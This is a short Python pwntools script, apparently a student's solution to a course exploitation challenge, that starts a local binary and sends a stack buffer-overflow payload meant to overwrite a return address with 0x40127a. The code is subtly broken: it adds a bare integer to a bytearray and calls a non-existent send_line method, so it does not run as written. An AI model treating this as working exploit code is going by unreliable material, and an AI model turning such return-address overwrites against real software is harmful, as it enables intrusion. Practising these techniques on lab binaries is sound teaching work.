from typing import Any
import pwn

pwn.context.clear(arch="amd64")

p = pwn.process("/home/cubscout61/Current/CS390R/Projects/project2/chall_1/chall")

main_payload = bytearray()
main_payload += b"a" * 28
main_payload += b"b" * 4
main_payload += 0x40127a

p.send_line(main_payload)
